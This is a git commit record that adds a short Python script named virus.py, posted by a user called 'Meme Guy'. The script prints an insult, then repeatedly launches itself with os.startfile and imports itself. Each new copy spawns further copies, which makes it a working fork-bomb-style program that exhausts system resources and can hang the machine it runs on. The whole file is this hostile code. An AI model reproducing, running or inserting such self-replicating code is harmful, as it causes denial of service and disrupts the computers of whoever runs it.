a926a7dc278d8ca72be35f9b8f78094a01284a55
Meme Guy <owen.debiasio@gmail.com>
2024-08-20 12:15:04 -0400

    Create virus.py

---
+++ virus.py
@@ -0,0 +1,12 @@
+import os
+
+def main():
+    print('Get fucked bozo')
+
+    os.startfile("virus.py")
+    os.startfile("virus.py")
+    os.startfile("virus.py")
+    os.startfile("virus.py")
+
+    import virus
+main()
